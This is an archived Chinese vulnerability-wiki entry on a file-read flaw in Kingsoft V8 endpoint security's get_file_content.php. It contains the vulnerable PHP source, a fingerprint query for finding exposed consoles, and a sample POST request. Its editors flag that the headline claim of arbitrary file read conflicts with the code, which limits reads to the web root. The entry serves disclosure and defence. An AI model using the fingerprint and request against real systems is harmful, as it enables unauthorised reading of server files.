---
source: "Threekiii/Vulnerability-Wiki"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "金山-V8-终端安全系统-get_file_content.php-任意文件读取漏洞"
product: "金山V8终端安全系统"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "源码明确阻止..并设open_basedir，标题任意服务器文件读取及没有任何过滤与正文冲突，实际仅允许范围"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E9%87%91%E5%B1%B1-V8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-get_file_content.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
version_unverified: "金山 V8 终端安全系统"
id: "vw-74b98dccdc5aca1ccab581ef"
entity_id: "ve-5cc70217fdbc97e894ef64dd"
schema_version: "1"
canonical: "Web安全/安全设备/金山终端安全/金山 V8 终端安全系统 get_file_content.php 任意文件读取漏洞.md"
relation_type: "duplicate_of"
---

# 金山-V8-终端安全系统-get_file_content.php-任意文件读取漏洞

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：金山V8终端安全系统
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：源码明确阻止..并设open_basedir，标题任意服务器文件读取及没有任何过滤与正文冲突，实际仅允许范围
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 源码明确阻止..并设open_basedir，标题任意服务器文件读取及没有任何过滤与正文冲突，实际仅允许范围
2. filepaht拼错filepath
3. /Console/receive_file与请求/receive_file需说明部署根
4. version只是产品名
5. 保留限制说明并补修复，归安全软件

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

## 漏洞描述

金山 V8 终端安全系统 存在任意文件读取漏洞，攻击者可以通过漏洞下载服务器任意文件

## 漏洞影响

```
金山 V8 终端安全系统
```

## 网络测绘

```
title="在线安装-V8+终端安全系统Web控制台"
```

## 漏洞复现

登录页面

![image-20220525150449778](./.resource/金山-V8-终端安全系统-get_file_content.php-任意文件读取漏洞/media/202205251504895.png)

存在漏洞的文件`/Console/receive_file/get_file_content.php`

```
<?php  
  if(stripos($_POST['filepath'],"..") !== false) {
    echo 'no file founggd';
    exit();
  }
  ini_set("open_basedir", "../");
  $file_path = '../'.iconv("utf-8","gb2312",$_POST['filepath']);
  if(!file_exists($file_path)){
    echo 'no file founggd';
    exit();
  }  

  $fp=fopen($file_path,"r");  
  $file_size=filesize($file_path); 

  $buffer=5024;  
  $file_count=0;  

  while(!feof($fp) && $file_count<$file_size){  
    $file_con=fread($fp,$buffer);  
    $file_count+=$buffer;  
    echo $file_con;  
  }  
  fclose($fp);  
?>
```



文件中没有任何的过滤 通过 filepaht 参数即可下载任意文件

由于不能出现 `..` ，所以只能读取web目录下的文件

```
POST /receive_file/get_file_content.php

filepath=login.php
```

![image-20220525150700239](./.resource/金山-V8-终端安全系统-get_file_content.php-任意文件读取漏洞/media/202205251507315.png)

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
